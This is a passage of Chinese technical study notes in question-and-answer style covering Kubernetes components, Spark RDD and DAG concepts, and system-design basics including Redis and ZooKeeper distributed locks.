如kube-scheduler进程与API Server的交互：Scheduler通过API Server的Watch接口监听到新建Pod副本的信息后，会检索所有符合该Pod要求的Node列表，开始执行Pod调度逻辑，在调度成功后将Pod绑定到目标节点上。

## 简述Kubernetes Scheduler作用及实现原理？

Kubernetes Scheduler是负责Pod调度的重要功能模块，Kubernetes Scheduler在整个系统中承担了“承上启下”的重要功能，“承上”是指它负责接收Controller Manager创建的新Pod，为其调度至目标Node；“启下”是指调度完成后，目标Node上的kubelet服务进程接管后继工作，负责Pod接下来生命周期。

Kubernetes Scheduler的作用是将待调度的Pod（API新创建的Pod、Controller Manager为补足副本而创建的Pod等）按照特定的调度算法和调度策略绑定（Binding）到集群中某个合适的Node上，并将绑定信息写入etcd中。

在整个调度过程中涉及三个对象，分别是待调度Pod列表、可用Node列表，以及调度算法和策略。

Kubernetes Scheduler通过调度算法调度为待调度Pod列表中的每个Pod从Node列表中选择一个最适合的Node来实现Pod的调度。随后，目标节点上的kubelet通过API Server监听到Kubernetes Scheduler产生的Pod绑定事件，然后获取对应的Pod清单，下载Image镜像并启动容器。

## 简述Kubernetes Scheduler使用哪两种算法将Pod绑定到worker节点？

Kubernetes Scheduler根据如下两种调度算法将 Pod 绑定到最合适的工作节点：

预选（Predicates）：输入是所有节点，输出是满足预选条件的节点。kube-scheduler根据预选策略过滤掉不满足策略的Nodes。如果某节点的资源不足或者不满足预选策略的条件则无法通过预选。如“Node的label必须与Pod的Selector一致”。

优选（Priorities）：输入是预选阶段筛选出的节点，优选会根据优先策略为通过预选的Nodes进行打分排名，选择得分最高的Node。例如，资源越富裕、负载越小的Node可能具有越高的排名。

## 简述Kubernetes准入机制？

在对集群进行请求时，每个准入控制代码都按照一定顺序执行。如果有一个准入控制拒绝了此次请求，那么整个请求的结果将会立即返回，并提示用户相应的error信息。

准入控制（AdmissionControl）准入控制本质上为一段准入代码，在对kubernetes api的请求过程中，顺序为：先经过认证 & 授权，然后执行准入操作，最后对目标对象进行操作。常用组件（控制代码）如下：

- AlwaysAdmit：允许所有请求
- AlwaysDeny：禁止所有请求，多用于测试环境。
- ServiceAccount：它将serviceAccounts实现了自动化，它会辅助serviceAccount做一些事情，比如如果pod没有serviceAccount属性，它会自动添加一个default，并确保pod的serviceAccount始终存在。
- LimitRanger：观察所有的请求，确保没有违反已经定义好的约束条件，这些条件定义在namespace中LimitRange对象中。
- NamespaceExists：观察所有的请求，如果请求尝试创建一个不存在的namespace，则这个请求被拒绝。

## 简述Kubernetes RBAC及其特点（优势）？

RBAC是基于角色的访问控制，是一种基于个人用户的角色来管理对计算机或网络资源的访问的方法。

相对于其他授权模式，RBAC具有如下优势：

- 对集群中的资源和非资源权限均有完整的覆盖。
- 整个RBAC完全由几个API对象完成， 同其他API对象一样， 可以用kubectl或API进行操作。
- 可以在运行时进行调整，无须重新启动API Server。

## 简述Kubernetes Secret作用？

Secret对象，主要作用是保管私密数据，比如密码、OAuth Tokens、SSH Keys等信息。将这些私密信息放在Secret对象中比直接放在Pod或Docker Image中更安全，也更便于使用和分发。

## 简述Kubernetes Secret有哪些使用方式？

创建完secret之后，可通过如下三种方式使用：

- 在创建Pod时，通过为Pod指定Service Account来自动使用该Secret。
- 通过挂载该Secret到Pod来使用它。
- 在Docker镜像下载时使用，通过指定Pod的spc.ImagePullSecrets来引用它。

## 简述Kubernetes网络模型？

Kubernetes网络模型中每个Pod都拥有一个独立的IP地址，并假定所有Pod都在一个可以直接连通的、扁平的网络空间中。所以不管它们是否运行在同一个Node（宿主机）中，都要求它们可以直接通过对方的IP进行访问。设计这个原则的原因是，用户不需要额外考虑如何建立Pod之间的连接，也不需要考虑如何将容器端口映射到主机端口等问题。

同时为每个Pod都设置一个IP地址的模型使得同一个Pod内的不同容器会共享同一个网络命名空间，也就是同一个Linux网络协议栈。这就意味着同一个Pod内的容器可以通过localhost来连接对方的端口。

在Kubernetes的集群里，IP是以Pod为单位进行分配的。一个Pod内部的所有容器共享一个网络堆栈（相当于一个网络命名空间，它们的IP地址、网络设备、配置等都是共享的）。

## 简述Kubernetes CNI模型？

CNI提供了一种应用容器的插件化网络解决方案，定义对容器网络进行操作和配置的规范，通过插件的形式对CNI接口进行实现。CNI仅关注在创建容器时分配网络资源，和在销毁容器时删除网络资源。在CNI模型中只涉及两个概念：容器和网络。

容器（Container）：是拥有独立Linux网络命名空间的环境，例如使用Docker或rkt创建的容器。容器需要拥有自己的Linux网络命名空间，这是加入网络的必要条件。

网络（Network）：表示可以互连的一组实体，这些实体拥有各自独立、唯一的IP地址，可以是容器、物理机或者其他网络设备（比如路由器）等。

对容器网络的设置和操作都通过插件（Plugin）进行具体实现，CNI插件包括两种类型：CNI Plugin和IPAM（IP Address  Management）Plugin。CNI Plugin负责为容器配置网络资源，IPAM Plugin负责对容器的IP地址进行分配和管理。IPAM Plugin作为CNI Plugin的一部分，与CNI Plugin协同工作。

## 简述Kubernetes网络策略？

为实现细粒度的容器间网络访问隔离策略，Kubernetes引入Network Policy。

Network Policy的主要功能是对Pod间的网络通信进行限制和准入控制，设置允许访问或禁止访问的客户端Pod列表。Network Policy定义网络策略，配合策略控制器（Policy Controller）进行策略的实现。

## 简述Kubernetes网络策略原理？

Network Policy的工作原理主要为：policy controller需要实现一个API Listener，监听用户设置的Network Policy定义，并将网络访问规则通过各Node的Agent进行实际设置（Agent则需要通过CNI网络插件实现）。

## 简述Kubernetes中flannel的作用？

Flannel可以用于Kubernetes底层网络的实现，主要作用有：

- 它能协助Kubernetes，给每一个Node上的Docker容器都分配互相不冲突的IP地址。
- 它能在这些IP地址之间建立一个覆盖网络（Overlay Network），通过这个覆盖网络，将数据包原封不动地传递到目标容器内。

## 简述Kubernetes数据持久化的方式有哪些？

Kubernetes 通过数据持久化来持久化保存重要数据，常见的方式有：

EmptyDir（空目录）：没有指定要挂载宿主机上的某个目录，直接由Pod内保部映射到宿主机上。类似于docker中的manager volume。

- 场景：
- 只需要临时将数据保存在磁盘上，比如在合并/排序算法中；
- 作为两个容器的共享存储。
- 特性：
- 同个pod里面的不同容器，共享同一个持久化目录，当pod节点删除时，volume的数据也会被删除。
- emptyDir的数据持久化的生命周期和使用的pod一致，一般是作为临时存储使用。

Hostpath：将宿主机上已存在的目录或文件挂载到容器内部。类似于docker中的bind mount挂载方式。

- 特性：增加了pod与节点之间的耦合。

PersistentVolume（简称PV）：如基于NFS服务的PV，也可以基于GFS的PV。它的作用是统一数据持久化目录，方便管理。

## 简述Kubernetes PV和PVC？

PV是对底层网络共享存储的抽象，将共享存储定义为一种“资源”。

PVC则是用户对存储资源的一个“申请”。

## 简述Kubernetes CSI模型？

Kubernetes CSI是Kubernetes推出与容器对接的存储接口标准，存储提供方只需要基于标准接口进行存储插件的实现，就能使用Kubernetes的原生存储机制为容器提供存储服务。CSI使得存储提供方的代码能和Kubernetes代码彻底解耦，部署也与Kubernetes核心组件分离，显然，存储插件的开发由提供方自行维护，就能为Kubernetes用户提供更多的存储功能，也更加安全可靠。

CSI包括CSI Controller和CSI Node：

- CSI Controller的主要功能是提供存储服务视角对存储资源和存储卷进行管理和操作。
- CSI Node的主要功能是对主机（Node）上的Volume进行管理和操作。

## 简述Kubernetes Worker节点加入集群的过程？

通常需要对Worker节点进行扩容，从而将应用系统进行水平扩展。主要过程如下：

- 1、在该Node上安装Docker、kubelet和kube-proxy服务；
- 2、然后配置kubelet和kubeproxy的启动参数，将Master URL指定为当前Kubernetes集群Master的地址，最后启动这些服务；
- 3、通过kubelet默认的自动注册机制，新的Worker将会自动加入现有的Kubernetes集群中；
- 4、Kubernetes Master在接受了新Worker的注册之后，会自动将其纳入当前集群的调度范围。

# Spark

## 简介

​	Spark 产生之前，已经有MapReduce这类非常成熟的计算系统存在了，并提供了高层次的API(map/reduce)，把计算运行在集群中并提供容错能力，从而实现分布式计算。虽然MapReduce提供了对数据访问和计算的抽象，但是对于数据的复用就是简单的将中间数据写到一个稳定的文件系统中(例如HDFS)，所以会产生数据的复制备份，磁盘的I/O以及数据的序列化，所以在遇到需要在多个计算之间复用中间结果的操作时效率就会非常的低。而这类操作是非常常见的，例如迭代式计算，交互式数据挖掘，图计算等。

​	因此出现了一个新的模型，叫RDD。RDD 是一个可以容错且并行的数据结构(其实可以理解成分布式的集合，操作起来和操作本地集合一样简单)，它可以让用户显式的将中间结果数据集保存在内存中，并且通过控制数据集的分区来达到数据存放处理最优化.同时 RDD也提供了丰富的 API (map、reduce、filter、foreach、redeceByKey...)来操作数据集。后来 RDD被 AMPLab 在一个叫做 Spark 的框架中提供并开源。

​	Spark 借鉴了 MapReduce 思想发展而来，保留了其分布式并行计算的优点并改进了其明显的缺陷。让中间数据存储在内存中提高了运行速度、并提供丰富的操作数据的API提高了开发速度。

​	Spark已经发展成为一个包含多个子项目的集合，其中包含SparkSQL、Spark Streaming、GraphX、MLlib等子项目。

**Spark Core**：实现了 Spark 的基本功能，包含RDD、任务调度、内存管理、错误恢复、与存储系统交互等模块。

**Spark SQL**：Spark 用来操作结构化数据的程序包。通过 Spark SQL，我们可以使用 SQL操作数据。

**Spark Streaming**：Spark 提供的对实时数据进行流式计算的组件。提供了用来操作数据流的 API。

**Spark MLlib**：提供常见的机器学习(ML)功能的程序库。包括分类、回归、聚类、协同过滤等，还提供了模型评估、数据导入等额外的支持功能。

**GraphX(图计算)**：Spark中用于图计算的API，性能良好，拥有丰富的功能和运算符，能在海量数据上自如地运行复杂的图算法。

**集群管理器**：Spark 设计为可以高效地在一个计算节点到数千个计算节点之间伸缩计算。

**StructuredStreaming**:处理结构化流,统一了离线和实时的API。

## spark和hadoop

|              |                   Hadoop                    |                    Spark                     |
| :----------: | :-----------------------------------------: | :------------------------------------------: |
|     类型     |       基础平台, 包含计算, 存储, 调度        |                分布式计算工具                |
|     场景     |           大规模数据集上的批处理            |         迭代计算, 交互式计算, 流计算         |
|     价格     |             对机器要求低, 便宜              |            对内存有要求, 相对较贵            |
|   编程范式   |   Map+Reduce, API 较为底层, 算法适应性差    | RDD组成DAG有向无环图, API 较为顶层, 方便使用 |
| 数据存储结构 | MapReduce中间计算结果存在HDFS磁盘上, 延迟大 |      RDD中间运算结果存在内存中 , 延迟小      |
|   运行方式   |       Task以进程方式维护, 任务启动慢        |        Task以线程方式维护, 任务启动快        |

**注意**：

尽管Spark相对于Hadoop而言具有较大优势，但Spark并不能完全替代Hadoop，Spark主要用于替代Hadoop中的MapReduce计算模型。存储依然可以使用HDFS，但是中间结果可以存放在内存中；调度可以使用Spark内置的，也可以使用更成熟的调度系统YARN等。 
实际上，Spark已经很好地融入了Hadoop生态圈，并成为其中的重要一员，它可以借助于YARN实现资源调度管理，借助于HDFS实现分布式存储。 
此外，Hadoop可以使用廉价的、异构的机器来做分布式存储与计算，但是，Spark对硬件的要求稍高一些，对内存与CPU有一定的要求。

## spark基本工作原理

* 分布式数据集：RDD在抽象上来说是一种元素集合，包含了数据。它是被分区的，分为多个分区，每个分区分布在集群中的不同节点上，从而让RDD中的数据可以被并行操作。
* 弹性：RDD的数据默认情况下存放在内存中的，但是在内存资源不足时，Spark会自动将RDD数据写入磁盘。
* 迭代式处理：对节点1、2、3、4上的数据进行处理完成之后，可能会移动到其他的节点内存中继续处理！Spark 与Mr最大的不同在与迭代式计算模型：Mr分为两个阶段，map和reduce，两个阶段处理完了就结束了，所以我们在一个job中能做的处理很有限，只能在map和reduce中处理；而spark计算过程可以分为n个阶段，因为他是内存迭代式的，我们在处理完一个阶段之后，可以继续往下处理很多阶段，而不是两个阶段。所以Spark相较于MR，计算模型可以提供更强大的功能。
* 容错性：RDD最重要的特性就是，提供了容错性，可以自动从节点失败中恢复过来。即如果某个节点上的RDD partition，因为节点故障，导致数据丢了，那么RDD会自动通过自己的数据来源重新计算该partition。这一切对使用者是透明的。

### spark组件

- master：管理集群和节点，不参与计算。
- worker：计算节点，进程本身不参与计算，和master汇报。
- Driver：运行程序的main方法，创建spark context对象。
- spark context：控制整个application的生命周期，包括dagsheduler和task scheduler等组件。
- client：用户提交程序的入口。

### RDD详解

#### 为啥要有RDD?

在许多迭代式算法(比如机器学习、图算法等)和交互式数据挖掘中，不同计算阶段之间会重用中间结果，即一个阶段的输出结果会作为下一个阶段的输入。但是，之前的MapReduce框架采用非循环式的数据流模型，把中间结果写入到HDFS中，带来了大量的数据复制、磁盘IO和序列化开销。且这些框架只能支持一些特定的计算模式(map/reduce)，并没有提供一种通用的数据抽象。

RDD提供了一个抽象的数据模型，让我们不必担心底层数据的分布式特性，只需将具体的应用逻辑表达为一系列转换操作(函数)，不同RDD之间的转换操作之间还可以形成依赖关系，进而实现管道化，从而避免了中间结果的存储，大大降低了数据复制、磁盘IO和序列化开销，并且还提供了更多的API(map/reduec/filter/groupBy...)。

#### RDD是什么

RDD(Resilient Distributed Dataset)叫做弹性分布式数据集，是Spark中最基本的数据抽象，代表一个不可变、可分区、里面的元素可并行计算的集合。
单词拆解：

- Resilient ：它是弹性的，RDD里面的中的数据可以保存在内存中或者磁盘里面
- Distributed ：它里面的元素是分布式存储的，可以用于分布式计算
- Dataset: 它是一个集合，可以存放很多元素

RDD 是一个数据集的表示，不仅表示了数据集，还表示了这个数据集从哪来，如何计算，主要属性包括：

1. 分区列表
2. 计算函数
3. 依赖关系
4. 分区函数(默认是hash)
5. 最佳位置

分区列表、分区函数、最佳位置，这三个属性其实说的就是数据集在哪，在哪计算更合适，如何分区； 
计算函数、依赖关系，这两个属性其实说的是数据集怎么来的。

#### RDD特性

1. 高效的容错性

**现有容错机制**：数据复制或者记录日志

**RDD具有天生的容错性**：血缘关系，重新计算丢失份去，无需回滚系统，重算过程在不同节点之间并行，只记录粗粒度的操作。

2. 中间结果持久化到内存，数据在内存的多个RDD操作之间进行传递，避免了不必要的读写磁盘开销。
3. 存放的数据可以是java对象，避免了不必要的对象序列化和反序列化。

#### RDD的创建方式

1. 由外部存储系统的数据集创建，包括本地的文件系统，还有所有Hadoop支持的数据集，比如HDFS、Cassandra、HBase等
2. 通过已有的RDD经过算子转换生成新的RDD：
3. 由一个已经存在的Scala集合创建：

#### RDD运行过程

DAGScheduler负责把DAG图分解成多个Stage，每个Stage中包含多个Task，每个Task会被TaskScheduler分发到各个WorkNode上的Executor上去执行。

#### RDD的算子分类

RDD的算子分为两类:

1. *Transformation*转换操作:**返回一个新的RDD**
2. *Action*动作操作:**返回值不是RDD(无返回值或返回其他的)**

> ❣️注意: 
> 1、RDD不实际存储真正要计算的数据，而是记录了数据的位置在哪里，数据的转换关系(调用了什么方法，传入什么函数)。 
> 2、RDD中的所有转换都是惰性求值/延迟执行的，也就是说并不会直接计算。只有当发生一个要求返回结果给Driver的Action动作时，这些转换才会真正运行。 
> 3、之所以使用惰性求值/延迟执行，是因为这样可以在Action时对RDD操作形成DAG有向无环图进行Stage的划分和并行优化，这种设计让Spark更加有效率地运行。

#### RDD的持久化/缓存

在实际开发中某些RDD的计算或转换可能会比较耗费时间，如果这些RDD后续还会频繁的被使用到，那么可以将这些RDD进行持久化/缓存，这样下次再使用到的时候就不用再重新计算了，提高了程序运行的效率。

RDD通过persist或cache方法可以将前面的计算结果缓存，但是并不是这两个方法被调用时立即缓存，而是触发后面的action时，该RDD将会被缓存在计算节点的内存中，并供后面重用。
通过查看RDD的源码发现cache最终也是调用了persist无参方法(默认存储只存在内存中)：

|              持久化级别               |                             说明                             |
| :-----------------------------------: | :----------------------------------------------------------: |
|          **MORY_ONLY(默认)**          | 将RDD以非序列化的Java对象存储在JVM中。 如果没有足够的内存存储RDD，则某些分区将不会被缓存，每次需要时都会重新计算。 这是默认级别 |
| **MORY_AND_DISK(开发中可以使用这个)** | 将RDD以非序列化的Java对象存储在JVM中。如果数据在内存中放不下，则溢写到磁盘上．需要时则会从磁盘上读取 |
|   MEMORY_ONLY_SER (Java and Scala)    | 将RDD以序列化的Java对象(每个分区一个字节数组)的方式存储．这通常比非序列化对象(deserialized objects)更具空间效率，特别是在使用快速序列化的情况下，但是这种方式读取数据会消耗更多的CPU |
| MEMORY_AND_DISK_SER (Java and Scala)  | 与MEMORY_ONLY_SER类似，但如果数据在内存中放不下，则溢写到磁盘上，而不是每次需要重新计算它们 |
|               DISK_ONLY               |                    将RDD分区存储在磁盘上                     |
|  MEMORY_ONLY_2, MEMORY_AND_DISK_2等   | 与上面的储存级别相同，只不过将持久化数据存为两份，备份每个分区存储在两个集群节点上 |
|           OFF_HEAP(实验中)            | 与MEMORY_ONLY_SER类似，但将数据存储在堆外内存中。 (即不是直接存储在JVM内存中) |

1. RDD持久化/缓存的目的是为了提高后续操作的速度
2. 缓存的级别有很多，默认只存在内存中,开发中使用memory_and_disk
3. 只有执行action操作的时候才会真正将RDD数据进行持久化/缓存
4. 实际开发中如果某一个RDD后续会被频繁的使用，可以将该RDD进行持久化/缓存

#### RDD的容错机制Checkpoint

**持久化的局限**：

持久化/缓存可以把数据放在内存中，虽然是快速的，但是也是最不可靠的；也可以把数据放在磁盘上，也不是完全可靠的！例如磁盘会损坏等。

**问题解决：**

Checkpoint的产生就是为了更加可靠的数据持久化，在Checkpoint的时候一般把数据放在在HDFS上，这就天然的借助了HDFS天生的高容错、高可靠来实现数据最大程度上的安全，实现了RDD的容错和高可用。

对频繁使用且重要的数据，先做缓存/持久化，再做checkpoint操作。

**持久化和Checkpoint的区别：**

1. 位置：

Persist 和 Cache 只能保存在本地的磁盘和内存中(或者堆外内存--实验中)
Checkpoint 可以保存数据到 HDFS 这类可靠的存储上。

2. 生命周期：

Cache和Persist的RDD会在程序结束后会被清除或者手动调用unpersist方法
Checkpoint的RDD在程序结束后依然存在，不会被删除。

#### RDD依赖关系

1. 宽窄依赖

RDD和它依赖的父RDD的关系有两种不同的类型，即**宽依赖**和**窄依赖**。

2. 如何区分宽窄依赖

窄依赖:父RDD的一个分区只会被子RDD的一个分区依赖； 
宽依赖:父RDD的一个分区会被子RDD的多个分区依赖(涉及到shuffle)。

3. 为什么要设计宽窄依赖

对于窄依赖：窄依赖的多个分区可以并行计算，窄依赖的一个分区的数据如果丢失只需要重新计算对应的分区的数据就可以了。

对于宽依赖：划分Stage(阶段)的依据是对于宽依赖,必须等到上一阶段计算完成才能计算下一阶段。

### **spark工作机制**

用户在client端提交作业后，会由Driver运行main方法并创建spark context上下文。执行add算子，形成dag图输入dagscheduler，按照add之间的依赖关系划分stage输入task scheduler。task scheduler会将stage划分为task set分发到各个节点的executor中执行。

​	**注**：DAG Scheduler 是面向stage的高层级的调度器，DAG Scheduler把DAG拆分为多个Task，每组Task都是一个stage，解析时是以shuffle为边界进行反向构建的，每当遇见一个shuffle，spark就会产生一个新的stage，接着以TaskSet的形式提交给底层的调度器（task scheduler），每个stage封装成一个TaskSet。DAG Scheduler需要记录RDD被存入磁盘物化等动作，同时会需要Task寻找最优等调度逻辑，以及监控因shuffle跨节点输出导致的失败。

### DAG的生成和划分Stage

#### DAG介绍

DAG(Directed Acyclic Graph有向无环图)指的是数据转换执行的过程，有方向，无闭环(其实就是RDD执行的流程)； 
原始的RDD通过一系列的转换操作就形成了DAG有向无环图，任务执行时，可以按照DAG的描述，执行真正的计算(数据被操作的一个过程)。

开始:通过SparkContext创建的RDD； 
结束:触发Action，一旦触发Action就形成了一个完整的DAG。

#### DAG划分Stage

![DAGååStage](https://segmentfault.com/img/remote/1460000039121649)

**一个Spark程序可以有多个DAG(有几个Action，就有几个DAG，上图最后只有一个Action（图中未表现）,那么就是一个DAG)**。

一个DAG可以有多个Stage(根据宽依赖/shuffle进行划分):

**同一个Stage可以有多个Task并行执行**(**task数=分区数**，如上图，Stage1 中有三个分区P1、P2、P3，对应的也有三个 Task)。

可以看到这个DAG中只reduceByKey操作是一个宽依赖，Spark内核会以此为边界将其前后划分成不同的Stage。

同时我们可以注意到，在图中Stage1中，**从textFile到flatMap到map都是窄依赖，这几步操作可以形成一个流水线操作，通过flatMap操作生成的partition可以不用等待整个RDD计算结束，而是继续进行map操作，这样大大提高了计算的效率**。

#### 为什么要划分Stage

一个复杂的业务逻辑如果有shuffle，那么就意味着前面阶段产生结果后，才能执行下一个阶段，即下一个阶段的计算要依赖上一个阶段的数据。那么我们按照shuffle进行划分(也就是按照宽依赖就行划分)，就可以将一个DAG划分成多个Stage/阶段，在同一个Stage中，会有多个算子操作，可以形成一个pipeline流水线，流水线内的多个平行的分区可以并行执行。

#### 如何划分DAG的stage？

对于窄依赖，partition的转换处理在stage中完成计算，不划分(将窄依赖尽量放在在同一个stage中，可以实现流水线计算)。

对于宽依赖，由于有shuffle的存在，只能在父RDD处理完成后，才能开始接下来的计算，也就是说需要要划分stage。

Spark会根据shuffle/宽依赖使用回溯算法来对DAG进行Stage划分，从后往前，遇到宽依赖就断开，遇到窄依赖就把当前的RDD加入到当前的stage/阶段中

### **数据倾斜的产生和解决办法**

数据倾斜以为着某一个或者某几个partition的数据特别大，导致这几个partition上的计算需要耗费相当长的时间。

在spark中同一个应用程序划分成多个stage，这些stage之间是串行执行的，而一个stage里面的多个task是可以并行执行，task数目由partition数目决定，如果一个partition的数目特别大，那么导致这个task执行时间很长，导致接下来的stage无法执行，从而导致整个job执行变慢。

避免数据倾斜，一般是要选用合适的key，或者自己定义相关的partitioner，通过加盐或者哈希值来拆分这些key，从而将这些数据分散到不同的partition去执行。

如下算子会导致shuffle操作，是导致数据倾斜可能发生的关键点所在：groupByKey；reduceByKey；aggregaByKey；join；cogroup；

### **RDD中reduceBykey与groupByKey哪个性能好，为什么**

**reduceByKey**：reduceByKey会在结果发送至reducer之前会对每个mapper在本地进行merge，有点类似于在MapReduce中的combiner。这样做的好处在于，在map端进行一次reduce之后，数据量会大幅度减小，从而减小传输，保证reduce端能够更快的进行结果计算。

**groupByKey**：groupByKey会对每一个RDD中的value值进行聚合形成一个序列(Iterator)，此操作发生在reduce端，所以势必会将所有的数据通过网络进行传输，造成不必要的浪费。同时如果数据量十分大，可能还会造成OutOfMemoryError。

所以在进行大量数据的reduce操作时候建议使用reduceByKey。不仅可以提高速度，还可以防止使用groupByKey造成的内存溢出问题。

### **Spark主备切换机制原理**

Master实际上可以配置两个，Spark原生的standalone模式是支持Master主备切换的。当Active Master节点挂掉以后，我们可以将Standby Master切换为Active Master。

Spark Master主备切换可以基于两种机制，一种是基于文件系统的，一种是基于ZooKeeper的。

基于文件系统的主备切换机制，需要在Active Master挂掉之后手动切换到Standby Master上；

而基于Zookeeper的主备切换机制，可以实现自动切换Master。

### **Spark streaming以及基本工作原理？**

Spark streaming是spark core API的一种扩展，可以用于进行大规模、高吞吐量、容错的实时数据流的处理。

它支持从多种数据源读取数据，比如Kafka、Flume、Twitter和TCP Socket，并且能够使用算子比如map、reduce、join和window等来处理数据，处理后的数据可以保存到文件系统、数据库等存储中。

**Spark streaming内部的基本工作原理是**：接受实时输入数据流，然后将数据拆分成batch，比如每收集一秒的数据封装成一个batch，然后将每个batch交给spark的计算引擎进行处理，最后会生产处一个结果数据流，其中的数据也是一个一个的batch组成的


# 系统设计

## 系统设计基础

### 性能

#### 性能指标

- 响应时间：指某个请求从发出到接收到响应消耗的时间
  - 在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。
- 吞吐量（QPS）：指系统在单位时间内可以处理的请求数量，通常适用每秒的请求数来衡量
- 并发用户数：指系统能同时处理的并发用户请求数量。
  - 在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。
  - 目前的大型系统都支持多线程处理并发情况，多线程能够提高吞吐量以及缩短响应时间，主要有两个原因：
    - 多CPU
    - IO等待时间
  - 适用IO多路复用等方式，系统在等待一个IO操作完成的这段时间内不需要被阻塞，可以去处理其他请求。通过将这个等待时间利用起来，使得CPU利用率大大提高。
  - 并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大增加。

#### 性能优化

- 集群：将多台服务器组成集群，适用负载均衡将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。
- 缓存：缓存也可以提高性能，主要是因为
  - 缓存数据通常位于内存等介质中，这种介质对于读操作特别快
  - 缓存数据可以位于靠近用户的地理位置上
  - 可以将计算结果进行缓存，从而避免重复计算
- 异步：某些流程可以将操作转换为消息，将消息发送到消息队列之后立即返回，之后这个操作会被异步处理。

### 伸缩性

指不断向集群中添加服务器来缓解不但上升的用户并发访问压力和不断增长的数据存储需求。

#### 伸缩性和性能

如果系统存在性能问题，那么单个用户的请求总是很慢的；

如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。

#### 实现伸缩性

应用服务器只要不具有状态，那么就可以很容易地通过负载均衡器向集群中添加新的服务器。

关系型数据库的伸缩性通过 Sharding 来实现，将数据按一定的规则分布到不同的节点上，从而解决单台存储服务器的存储空间限制。

对于非关系型数据库，它们天生就是为海量数据而诞生，对伸缩性的支持特别好。

### 扩展性

指的是添加新功能时对现有系统的其它应用无影响，这就要求不同应用具备低耦合的特点。

实现可扩展主要有两种方式：

- 使用消息队列进行解耦，应用之间通过消息传递进行通信；
- 使用分布式服务将业务和可复用的服务分离开来，业务使用分布式服务框架调用可复用的服务。新增的产品可以通过调用可复用的服务来实现业务逻辑，对其它产品没有影响。

### 可用性

#### 冗余

保证高可用的主要手段是使用冗余，当某个服务器故障时就请求其它服务器。

应用服务器的冗余比较容易实现，只要保证应用服务器不具有状态，那么某个应用服务器故障时，负载均衡器将该应用服务器原先的用户请求转发到另一个应用服务器上，不会对用户有任何影响。

存储服务器的冗余需要使用主从复制来实现，当主服务器故障时，需要提升从服务器为主服务器，这个过程称为切换。

#### 监控

对 CPU、内存、磁盘、网络等系统负载信息进行监控，当某个信息达到一定阈值时通知运维人员，从而在系统发生故障之前及时发现问题。

#### 服务降级

服务降级是系统为了应对大量的请求，主动关闭部分功能，从而保证核心功能可用。

### 安全性

要求系统在应对各种攻击手段时能够有可靠的应对措施。

## 分布式

### 分布式锁

在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。

阻塞锁通常使用互斥量来实现：

- 互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态；
- 互斥量为 1 表示未锁定状态。

1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。

#### 需要具备的条件

- 在分布式系统 环境下，一个方法在同一时间只能被一个机器的一个线程执行
- 高可用和高性能的获取锁和释放锁
- 具备可重入特性
- 具备锁失效机制，防止死锁
- 具备非阻塞锁机制，即没有获取到锁将直接返回锁失败

#### 使用数据库的唯一索引实现

获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否处于锁定状态。

存在以下几个问题：

- 强依赖数据库的可用性，数据库是一个单点，一旦数据库宕机，会导致业务系统不可用

- 锁没有失效时间，解锁失败的话其他进程无法再获得该锁
- 只能是非阻塞锁，插入失败直接就报错了，无法重试；可以在程序中循环检测来解决
- 不可重入，已经获得锁的进程也必须重新获取锁

#### 基于缓存（Redis）实现

```
set resource_name random_value EX expire_time NX;
```

该命令仅在锁不存在时才可以设置（NX），到期时间为`expire_time`。

锁的value被设置为`random_value`，该值必须再所有客户端和所有锁定请求中都是唯一的。设定随机值是为了以安全的方式释放锁，也就是当锁存在并且锁里存储的值和我的一致时才可以删除该锁。可以通过Lua脚本实现原子操作：

```lua
if redis.call("get", KEYS[1]) == ARGV[1] then
	return redis.call("del", KEYS[1])
else
	return 0
end
```

同时该分布式锁无法解决超时的问题，如果在加锁和释放锁之间的逻辑执行太长，以至于超出了锁的超时限制，就会出现问题：因为这时候锁过期了，其他的线程会持有这个锁，为了避免这个问题，Redis分布式锁不要用于较长时间的任务，也可以设置一个看门狗，根据客户端持有锁的状态动态增长过期时间。

对于集群环境下的分布式锁，主节点挂掉后，从节点取而代之，但如果没有及时同步，会导致当另一个客户端过来请求加锁时，立即就批准了，这样会导致系统中同样一把锁被两个客户端同时持有，不安全性由此产生。不过这种情况也仅仅是在主从节点发生failover的情况下才会发生，而且持续时间很短，业务系统多数情况下可以容忍。

**RedLock算法**：使用多个Redis实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。

- 尝试从N个互相独立Redis实例获取锁；
- 计算获取锁消耗的时间，如果时间小于锁的过期时间，并且从大多数(N/2+1)实例上获取了锁，才认为获取成功。
- 如果获取锁失败，就到每个实例上释放锁

#### 基于zookeeper实现

zookeeper的数据存储结构就像一棵树，这棵树由节点（znode）组成。分为四种类型：

- 持久节点（Persistent）：默认的节点类型，创建节点的客户端与zookeeper断开连接后，该节点依旧存在。
- 持久节点顺序节点（Persistent_sequential）：所谓顺序节点，就是在创建节点的时候，zookeeper根据创建的时间顺序给该节点名称进行编号。
- 临时节点（ephemeral）：和持久节点相反，当创建节点的客户端与zookeeper断开连接后，临时节点会被删除。
- 临时顺序节点（Ephemeral_sequential）：集合临时节点和顺序节点的特点，在创建节点时，zookeeper根据创建的时间顺序给该节点名称进行编号；当创建节点的客户端与zookeeper断开连接后，临时节点会被删除。

##### 实现原理

利用到了zookeeper中的临时顺序节点。

- 首先在zookeeper中创建一个持久节点parentlock。

- 当第一个客户端client1想要获取锁时，需要在parentlock这个节点下面创建一个临时顺序节点lock1，之后client1查找parentlock下面所有的临时顺序节点并排序，判断自己所创建的节点lock1是不是顺序最靠前的，如果是就获得锁。
- 其他节点获取锁时，也创建一个临时顺序节点lock2，不是最靠前的，此时client2向排序仅比它靠前的节点lock1注册watcher，用于监听lock1是否存在。这意味着client2枪锁失败，进入等待状态。
- 当client1任务完成，会显示调用删除lock1的指令；或者任务执行过程中client1崩溃，此时它会断开与zookeeper服务的连接，此时lock1会自动删除。
